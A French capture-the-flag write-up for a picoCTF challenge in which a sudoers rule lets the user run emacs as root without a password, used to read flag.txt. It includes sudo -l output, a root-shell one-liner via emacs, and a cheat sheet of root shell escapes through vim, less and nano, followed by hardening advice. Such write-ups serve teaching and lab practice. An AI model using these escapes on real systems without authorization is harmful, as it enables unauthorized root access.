---
title: "Sudo make me a sandwich"
---

# 🧰 SUDO MAKE ME A SANDWICH

Élévation de privilèges via configuration Sudo permissive (Emacs)

**Plateforme :** picoCTF 2026 · **Catégorie :** General Skills / PrivEsc · **Difficulté :** *Easy*{: .badge-easy} · **Auteur :** Darkraicg492
{: .ctf-meta}

!!! success "Flag"
    Présent dans `flag.txt` (lu via Emacs avec privilèges root)

## Objectif & résumé de la vulnérabilité

L'objectif de ce challenge est d'obtenir des privilèges administratifs (`root`) ou de contourner les restrictions de lecture du système de fichiers afin de lire le contenu de `flag.txt` accessible uniquement en superutilisateur.

La vulnérabilité repose sur une **mauvaise configuration du fichier `/etc/sudoers`** : l'utilisateur non privilégié `ctf-player` possède l'autorisation d'exécuter l'éditeur de texte `/bin/emacs` en tant que `root` sans avoir à fournir de mot de passe (`NOPASSWD`).

!!! danger "Concept clé : abus de binaires sudo & principe du moindre privilège"
    Accorder des droits sudo sur des éditeurs de texte complets (comme `emacs`, `vim` ou `nano`) annule toute restriction d'accès au système de fichiers. Un utilisateur disposant de ce privilège peut lire/écrire n'importe quel fichier sensible système ou faire spawner un shell superutilisateur direct.

## Outils & concepts clés

| Outil / Concept | Rôle & utilisation dans le CTF |
| :--- | :--- |
| `sudo -l` | Commande d'énumération listant les règles d'exécution autorisées dans `/etc/sudoers` |
| `/bin/emacs` | Éditeur de texte dont l'exécution avec privilèges root permet la lecture/édition de fichiers protégés |
| GTFOBins | Base de connaissances de référence pour détourner des binaires Unix légitimes |
| Élévation de privilèges (PrivEsc) | Phase post-exploitation : passer d'un compte restreint à des privilèges administratifs complets |

## Démarche pas à pas

### Étape 1 — Connexion & énumération des privilèges sudo

Après connexion en SSH, une première tentative de lecture directe de `flag.txt` échoue (`Permission denied`). Le réflexe `sudo -l` révèle les privilèges accordés :

```text
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

### Étape 2 — Analyse du binaire autorisé

La ligne `(ALL) NOPASSWD: /bin/emacs` montre que `emacs` peut être exécuté sous l'identité de n'importe quel utilisateur (dont `root`) sans mot de passe.

### Étape 3 — Exploitation & lecture du flag

```bash
sudo /bin/emacs flag.txt
```

L'interface textuelle d'Emacs s'ouvre avec des droits `root`, chargeant le contenu de `flag.txt` à l'écran.

Alternative GTFOBins pour l'obtention d'un shell root direct :

```bash
sudo /bin/emacs --eval '(term)'
```

## Mémento technique (cheatsheet PrivEsc sudo)

| Binaire sudo | Méthode d'obtention de shell / lecture root |
| :--- | :--- |
| `emacs` | `sudo emacs --eval '(term)'` ou ouverture directe du fichier cible |
| `vim` / `vi` | `sudo vim` puis `:!sh` ou `:set shell=/bin/sh` puis `:shell` |
| `less` / `more` | `sudo less /etc/profile` puis `!/bin/sh` |
| `nano` | `sudo nano`, puis `Ctrl+R` puis `Ctrl+X` pour exécuter une commande shell |

## ✅ Leçons retenues & réflexes à garder

- **Systématique `sudo -l` :** premier réflexe absolu lors de la phase d'énumération locale sur un système Linux.
- **Référentiel GTFOBins :** dès qu'un binaire apparaît dans les commandes sudo ou possède le bit SUID, consulter immédiatement [GTFOBins](https://gtfobins.github.io/) pour identifier le vecteur d'abus.
- **Hardening :** ne jamais attribuer de privilèges sudo sur des applications interactives permettant d'exécuter des sous-processus ou de manipuler arbitrairement le système de fichiers.
